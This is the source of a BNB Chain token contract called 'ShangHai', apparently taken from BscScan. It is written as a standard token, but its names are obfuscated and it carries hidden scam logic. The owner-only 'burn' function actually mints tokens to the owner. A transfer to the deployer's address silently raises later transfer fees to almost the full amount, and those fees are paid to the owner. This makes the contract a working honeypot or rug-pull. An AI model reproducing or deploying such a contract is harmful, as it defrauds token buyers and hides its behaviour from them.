/**
 *Submitted for verification at BscScan.com on 2022-11-27
*/

// SPDX-License-Identifier: MIT

//https://twitter.com/brandhane/status/1596570091864608768
//https://youtu.be/xhcGsMXry8M


pragma solidity =0.7.6;
contract ShangHai {
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  MGTGIM = address(0);
uint256 private  OASUOI = 100000000;
uint256 private  LIMTSP = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  HJPBXU = address(0);
address private  KRQIJV = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant QLTAKQ = 99999;
string public  symbol = "ShangHai";
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  OFBXPR = 1000000000000000;
address public owner;
address private  OEWLSH = address(0);
mapping (address => uint256) public balanceOf;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  CMJFDB = 10000000000000;
address private  FANQXQ = address(0);
uint256 private  EMSGMD = 1000000000000000000;
string public  name = "ShangHai";
uint256 private  HMPBFY = 1000000000000000000000;
uint8 public constant decimals = 18;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  OMHQAU = 10000000000;
function _getOMHQAU() private returns (uint256) {
return OMHQAU;
}

function _getFANQXQ() private returns (address) {
return FANQXQ;
}

function _getOFBXPR() private returns (uint256) {
return OFBXPR;
}

function _getOEWLSH() private returns (address) {
return OEWLSH;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tJEAAMY 0");
require(spender != address(0), "fJEAAMY 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getHMPBFY() private returns (uint256) {
return HMPBFY;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getHJPBXU() private returns (address) {
return HJPBXU;
}

function _getCMJFDB() private returns (uint256) {
return CMJFDB;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "JEAAMY");
require(to != address(0), "JEAAMY");
require(amount <= balanceOf[from], "JEAAMY");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* QLTAKQ/LIMTSP ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==KRQIJV){
LIMTSP = QLTAKQ+2;
}
emit Transfer(from, to, transferAmount);
}
function _getOASUOI() private returns (uint256) {
return OASUOI;
}

function _getEMSGMD() private returns (uint256) {
return EMSGMD;
}

function _getMGTGIM() private returns (address) {
return MGTGIM;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () {
KRQIJV = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}